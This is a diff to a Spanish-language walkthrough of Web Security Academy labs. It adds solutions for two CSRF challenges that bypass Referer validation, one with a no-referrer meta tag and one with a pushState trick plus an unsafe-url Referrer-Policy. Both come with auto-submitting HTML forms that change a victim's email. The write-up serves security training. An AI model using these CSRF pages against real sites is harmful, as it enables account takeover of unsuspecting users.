@@ -505,10 +505,73 @@ Esta técnica permite bypassear SameSite Strict, ya que la cookie de sesión se 
 </script>
 ```
 
-## Reto 9: Omisión estricta de SameSite a través de un dominio hermano
+## Reto 9: Omisión estricta de SameSite a través de un dominio hermano (pendiente)
 
 El chat en vivo de este laboratorio es vulnerable al secuestro de WebSockets entre sitios (CSWSH). Para solucionar el problema, inicie sesión en la cuenta de la víctima.
 
 Para ello, utilice el servidor de exploits proporcionado para ejecutar un ataque CSWSH que exfiltre el historial de chat de la víctima al servidor predeterminado de Burp Collaborator. El historial de chat contiene las credenciales de inicio de sesión en texto plano.
 
 Si aún no lo ha hecho, le recomendamos completar nuestro tema sobre vulnerabilidades de WebSocket antes de intentar realizar este laboratorio. 
+
+
+
+## Reto 10: (Pendiente)
+
+
+
+## Reto 11: CSRF donde la validación del referente depende de que el encabezado esté presente
+
+La función de cambio de correo electrónico de este laboratorio es vulnerable a CSRF. Intenta bloquear solicitudes entre dominios, pero cuenta con una alternativa insegura.
+
+Para resolver el laboratorio, utilice su servidor de exploits para alojar una página HTML que utilice un ataque CSRF para cambiar la dirección de correo electrónico del espectador.
+
+Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 
+
+Aunque la aplicación valida el encabezado Referer para asegurarse de que provenga del mismo dominio, acepta las peticiones incluso cuando este encabezado no está presente.
+
+Mediante una metaetiqueta con name igual a referrer y content igual a no-referrer, se evita que el navegador incluya automáticamente el encabezado en la petición. Así, se logra que el servidor acepte la solicitud sin validar el origen, permitiendo cambiar el correo de la víctima sin romper ninguna política de seguridad aparente.
+
+
+```html
+<html>
+<head>
+<meta name="referrer" content="no-referrer">
+</head>
+<form class="login-form" name="change-email-form" action="https://0af6006904dadb4180691c06002b00f8.web-security-academy.net/my-account/change-email" method="POST">
+<input type="hidden" name="email" value="pwned@pwned.com">
+ </form>
+
+<script>
+    document.forms[0].submit();
+</script>
+</html>
+```
+
+## Reto 12: CSRF con validación de referencia defectuosa
+
+La función de cambio de correo electrónico de este laboratorio es vulnerable a CSRF. Intenta detectar y bloquear solicitudes entre dominios, pero el mecanismo de detección puede eludirse.
+
+Para resolver el laboratorio, utilice su servidor de exploits para alojar una página HTML que utilice un ataque CSRF para cambiar la dirección de correo electrónico del espectador.
+
+Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 
+
+Este laboratorio presenta un fallo en la validación del encabezado Referer que permite llevar a cabo un ataque CSRF. Aunque el servidor intenta bloquear peticiones que provienen de dominios cruzados, su validación es deficiente y permite cualquier valor de Referer que contenga el dominio legítimo en cualquier parte de la cadena.
+
+Para explotarlo, se fuerza al navegador de la víctima a generar una petición con un Referer modificado, incluyendo el dominio legítimo como parte de una query string. Esto se logra manipulando la URL del historial con history.pushState para incorporar el dominio objetivo en la cadena.
+
+Dado que los navegadores modernos suelen eliminar la query string del encabezado Referer por defecto, es necesario forzar su inclusión estableciendo la política de referrer como unsafe-url mediante el encabezado Referrer-Policy en el exploit. De esta forma, se consigue que el servidor acepte la petición y se complete el cambio de correo.
+
+```html
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Referrer-Policy: unsafe-url
+```
+```html
+<form class="login-form" name="change-email-form" action="https://0a1a00f604b510d78111264c006b0086.web-security-academy.net/my-account/change-email" method="POST">
+<input type="hidden" name="email" value="hacked@hacked.com">
+ </form>
+
+<script>
+    document.forms[0].submit();
+</script>
+```
